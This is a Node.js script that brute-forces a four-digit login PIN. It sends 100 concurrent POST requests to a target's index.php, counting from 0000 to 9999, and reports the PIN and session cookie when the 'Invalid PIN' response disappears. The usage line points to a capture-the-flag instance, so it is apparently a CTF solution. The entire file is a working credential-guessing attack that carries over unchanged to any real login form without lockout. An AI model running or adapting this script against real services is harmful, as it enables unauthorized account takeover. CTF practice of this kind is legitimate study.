const BASE = process.argv[2]?.replace(/\/$/, "");
const CONCURRENCY = 100;

if (!BASE) {
  console.error("Usage: node brute-pin.js https://dalctf-secureform-admin-183-64616c.instancer.dalctf2026.com");
  process.exit(1);
}

let next = 0;
let tried = 0;
let found = false;

const controller = new AbortController();

async function tryPin(pin) {
  const res = await fetch(`${BASE}/index.php`, {
    method: "POST",
    redirect: "manual",
    signal: controller.signal,
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({ pin }),
  });

  const text = await res.text();

  const invalid = /Invalid PIN/i.test(text);

  return {
    pin,
    ok: !invalid || res.status === 302 || res.status === 303,
    status: res.status,
    location: res.headers.get("location"),
    cookie: res.headers.get("set-cookie"),
  };
}

async function worker() {
  while (!found) {
    const n = next++;
    if (n > 9999) return;

    const pin = String(n).padStart(4, "0");

    try {
      const r = await tryPin(pin);
      tried++;

      if (tried % 100 === 0) {
        process.stdout.write(`\rTried ${tried}/10000 | last ${pin}`);
      }

      if (r.ok) {
        found = true;
        controller.abort();

        console.log(`\n[+] PIN: ${r.pin}`);

        process.exit(0);
      }
    } catch (e) {
      if (!found && e.name !== "AbortError") {
        console.error(`\n[!] ${pin}: ${e.message}`);
      }
    }
  }
}

(async () => {
  console.log(`[+] Target: ${BASE}/index.php`);
  console.log(`[+] Concurrency: ${CONCURRENCY}`);

  await Promise.all(
    Array.from({ length: CONCURRENCY }, () => worker())
  );

  if (!found) {
    console.log("\n[-] PIN not found");
  }
})();